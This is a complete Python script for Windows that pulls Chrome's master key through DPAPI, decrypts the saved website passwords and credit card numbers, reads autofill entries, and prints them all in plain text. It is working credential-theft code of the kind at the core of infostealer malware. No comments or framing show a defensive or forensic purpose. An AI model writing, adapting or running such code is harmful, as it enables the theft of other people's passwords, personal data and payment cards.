import os
import json
import base64
import sqlite3
import win32crypt  # Requires pywin32 module
from Crypto.Cipher import AES  # Requires pycryptodome module

def get_chrome_master_key(local_state_path):
    with open(local_state_path, 'r', encoding='utf-8') as file:
        local_state_data = json.load(file)
    encrypted_key_b64 = local_state_data['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(ciphertext, master_key):
    nonce, cipherbytes_tag = ciphertext[3:15], ciphertext[15:]  # Remove 'v10' prefix
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
    decrypted_pass = cipher.decrypt_and_verify(cipherbytes_tag[:-16], cipherbytes_tag[-16:])
    return decrypted_pass.decode()

def get_table_exists(cursor, table_name):
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
    return cursor.fetchone() is not None

def get_chrome_logins(login_data_path, master_key):
    conn = sqlite3.connect(login_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'logins'):
        conn.close()
        return []
    cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
    logins = cursor.fetchall()
    conn.close()
    
    decrypted_logins = []
    for origin_url, username, password_value in logins:
        if password_value:
            try:
                decrypted_password = decrypt_password(password_value, master_key)
                decrypted_logins.append((origin_url, username, decrypted_password))
            except Exception as e:
                print(f"Failed to decrypt password for {origin_url}: {e}")
    
    return decrypted_logins

def get_chrome_autofill(web_data_path):
    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'autofill'):
        conn.close()
        return []
    cursor.execute('SELECT name, value FROM autofill')
    autofill_entries = cursor.fetchall()
    conn.close()
    return autofill_entries

def get_chrome_payment_data(web_data_path, master_key):
    conn = sqlite3.connect(web_data_path)
    cursor = conn.cursor()
    if not get_table_exists(cursor, 'credit_cards'):
        print("The 'credit_cards' table does not exist.")
        conn.close()
        return []
    cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards')
    payment_data = cursor.fetchall()
    conn.close()
    
    if not payment_data:
        print("No payment data found in the 'credit_cards' table.")
        return []

    decrypted_payments = []
    for name_on_card, exp_month, exp_year, card_number_encrypted in payment_data:
        if card_number_encrypted:
            try:
                decrypted_card_number = decrypt_password(card_number_encrypted, master_key)
                decrypted_payments.append((name_on_card, exp_month, exp_year, decrypted_card_number))
            except Exception as e:
                print(f"Failed to decrypt card number for {name_on_card}: {e}")
    
    return decrypted_payments

def main():
    user_home = os.path.expanduser("~")
    local_state_path = os.path.join(user_home, r"AppData\Local\Google\Chrome\User Data\Local State")
    login_data_path = os.path.join(user_home, r"AppData\Local\Google\Chrome\User Data\Default\Login Data")
    web_data_path = os.path.join(user_home, r"AppData\Local\Google\Chrome\User Data\Default\Web Data")
    
    if not os.path.isfile(local_state_path):
        print(f"Local State file not found at: {local_state_path}")
        return

    if not os.path.isfile(login_data_path):
        print(f"Login Data file not found at: {login_data_path}")
        return

    if not os.path.isfile(web_data_path):
        print(f"Web Data file not found at: {web_data_path}")
        return
    
    try:
        master_key = get_chrome_master_key(local_state_path)
    except Exception as e:
        print(f"Failed to retrieve master key: {e}")
        return
    
    try:
        logins = get_chrome_logins(login_data_path, master_key)
        autofill = get_chrome_autofill(web_data_path)
        payments = get_chrome_payment_data(web_data_path, master_key)
    except Exception as e:
        print(f"Failed to retrieve data: {e}")
        return
    
    print("\nLogins:")
    for origin_url, username, password in logins:
        print(f"Origin URL: {origin_url}\nUsername: {username}\nPassword: {password}\n")
    
    print("\nAutofill:")
    for name, value in autofill:
        print(f"Name: {name}\nValue: {value}\n")
    
    print("\nPayment Data:")
    if payments:
        for name_on_card, exp_month, exp_year, card_number in payments:
            print(f"Name on Card: {name_on_card}\nExpiration Month: {exp_month}\nExpiration Year: {exp_year}\nCard Number: {card_number}\n")
    else:
        print("No payment data found.")

if __name__ == "__main__":
    main()
